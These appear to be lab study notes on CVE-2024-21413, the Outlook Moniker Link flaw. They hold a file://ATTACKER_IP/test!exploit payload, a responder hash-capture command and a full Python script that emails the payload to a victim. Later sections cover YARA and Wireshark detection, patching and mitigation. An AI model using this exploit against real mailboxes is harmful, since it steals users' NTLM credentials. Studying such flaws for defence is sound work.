# Moniker Link

This is a CVE-2024-21413 vulnerability in Microsoft Outlook that permits the unauthorized acquisition of NTLM credentials



The propuse of this vulnerability is to mailer a target with a "Moniker Link" to bypass de "Protected View" and capture the netNTLMv2 hash that is used by the SMB protocol to communly share files into a corporate network.

> this hash can be use to then pass it to John the ripper or HashCat to reach the PW this hash contains
> 
> This Hash contains the user's `machine PW`



So, this is an Outlook instruction to attempt to access as file.

```bash
<a href="file://ATTACKER_IP/test">Click me</a>
```



 Into de "ATTACKER_IP" needs to replace by the attacker IP maquine. SMB protocol is used  . However the "Protected View" blocks this.



---

## Exploit

So, to bypass the "Protected View" we needs to add `!` in that line, eg:

 ```<p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>```

As soon as the user click on that link our attacker maquine will capture the netNTLMv2 hash using the tool `responder` previously open in the attacker maquine:

```bash
responder -I ens5
```

> Nota: `ens5` The interface name will differ depending on the machine we use. to know that we use `ip a` or `ifconfig`
> 
> Responder storage the outputs in the machine, eg. Kali: /usr/share/responder/logs/IP_target.txt





So then, we can make a email as bellow with `nano` and execute this with `python3`

```bash
>nano exploit.py
#paste the POC
>python3 exploit.py
```

### POC {remember to check the # notes and change the info}

```bash
'''
Author: CMNatic | https://github.com/cmnaticVersion: 1.0 | 19/02/2024
'''
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm' # Replace with your sender email address
receiver_email = 'victim@monikerlink.thm' # Replace with the recipient email address
password = input("Enter your attacker email password: ")

# Aca debes de cambiar y colocar la IP de Atacante despues del file://
html_content = """\<!DOCTYPE html><html lang="en">    <p><a href="file://IP Del attacante/test!exploit">Click me</a></p>    </body></html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

# Convert the HTML string into bytes and attach it to the message object
msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

# Aca debes de colocar la IP del traget en MAILSERVER
server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
    server.login(sender_email, password)
except Exception as err:
    print(err)
    exit(-1)

try:
    server.sendmail(sender_email, [receiver_email], message.as_string())
    print("\n Email delivered")
except Exception as error:
    print(error)
finally:
    server.quit()
```



If this is succesfuly done, as soon as the target click on the link attached in the mail, we will be able to see the hash in the terminal with the tool `responder`



---

## Detection

A [Yara rule](https://github.com/Neo23x0/signature-base/blob/master/yara/expl_outlook_cve_2024_21413.yar) has been created by [Florian Roth](https://twitter.com/cyb3rops/status/1758792873254744344) to detect emails containing the `file:\\` element in the Moniker Link.

```bash
user@yourmachine:# cat cve-2024-21413.yar 
```

> Yara es como el motor de un antivirus, pero donde **tú** escribes las reglas. No viene instalado por defecto en las computadoras normales.Los equipos de ciberseguridad defensiva descargan el motor de Yara y luego le inyectan "Reglas" (Rules), que son simplemente scripts de texto con condiciones lógicas.Por ejemplo, la regla para este CVE de Outlook básicamente dice: _"Yara, escanea todos los correos entrantes. Si ves un enlace que empieza con `file://` y termina con el símbolo `!`, bloquea el correo y levanta una alerta"_. Las empresas usan estas reglas en sus firewalls o sistemas de monitoreo para detectar amenazas en tiempo real.





Also this can be detected with `Wireshark` checking the SMB request

* SMB = port 445 [or old 139]

* Security Blob
  
  * NTLM Secure Services Provider
    
    * NTLM Response

---

## Remediation and Mitigation

Info about the MS patch: [LINK](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413)



Practice general - safe - cyber security practices. For example, reminding users to:

* Do not click random links (especially from unsolicited emails)
* Preview links before clicking them
* Forward suspicious emails to the respective department responsible for cyber security
  
  

Additionally, preventing the SMB protocol entirely may do more harm than good, especially as it is essential for accessing network shares. However, you may be able to block this at the firewall level, depending on the organisation.

> SMB (Server Message Block) Es el protocolo estándar de Microsoft Windows para compartir archivos, impresoras y recursos a través de una red local. Funciona en el puerto 445. Es un protocolo tan vital para el trabajo diario en las oficinas que siempre está activo, y como requiere que los usuarios se autentiquen para acceder a las carpetas, es uno de los blancos favoritos de los atacantes para capturar credenciales.



Update Outlook through Windows Update or the Microsoft Update Catalog as soon as possible, as there is no way to prevent Outlook's "Protected View" from being bypassed.
